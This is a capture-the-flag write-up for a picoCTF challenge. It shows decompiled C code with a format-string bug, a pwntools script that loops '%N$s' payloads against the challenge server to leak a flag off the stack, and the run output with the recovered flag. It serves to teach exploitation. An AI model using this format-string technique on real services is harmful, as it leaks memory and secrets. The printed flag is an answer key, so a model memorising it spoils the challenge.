# buffer overflow 2 Writeup

## Steps:
1. Open in ghidra and analyze
        - Notice functions called `vuln` and the use of `printf` with an input
```
void vuln(void)
{
  char input [128];
  char flag [64];
  
  readflag(flag,0x40);
  printf("Tell me a story and then I\'ll tell you one >> ");
  __isoc99_scanf("%127s",input);
  puts("Here\'s a story - ");
  printf(input);
  putchar(10);
  return;
}
```
2. Write a format string that reads `flag` off the stack. Use a loop over length of flag array because we do not know where the flag starts.

3. Create the payload and send it to the process
```
from pwn import *

for i in range(65):
    p = remote("saturn.picoctf.net", 63879).
    p.recvuntil('> ')

    payload = "%"+str(i)+"$s"
    p.sendline(payload)
    s = p.recv().decode('latin-1')
    print(i,s)

    p.close()

```


## Solution:
```
$ python3 flag_leak.py
[+] Opening connection to saturn.picoctf.net on port 63879: Done
/home/kali/Binex-Writeups/picoCTF/binex/flag_leak/flag_leak.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('> ')
/home/kali/Binex-Writeups/picoCTF/binex/flag_leak/flag_leak.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(payload)
0 Here's a story - 
%0$s

[*] Closed connection to saturn.picoctf.net port 63879
[+] Opening connection to saturn.picoctf.net on port 63879: Done
1 Here's a story - 
%1$s

[*] Closed connection to saturn.picoctf.net port 63879
[+] Opening connection to saturn.picoctf.net on port 63879: Done
2 Here's a story - 
\x10aÏ÷
...
[*] Closed connection to saturn.picoctf.net port 63879
[+] Opening connection to saturn.picoctf.net on port 63879: Done
24 Here's a story - 
CTF{L34k1ng_Fl4g_0ff_St4ck_95f60617}
...
[*] Closed connection to saturn.picoctf.net port 63879
[+] Opening connection to saturn.picoctf.net on port 63879: Done
63 Here's a story - 
Ä\x10ì\x0cPèß\x01

[*] Closed connection to saturn.picoctf.net port 63879
[+] Opening connection to saturn.picoctf.net on port 63879: Done
64 Here's a story - 
l}\x1e

[*] Closed connection to saturn.picoctf.net port 63879
```
                                    
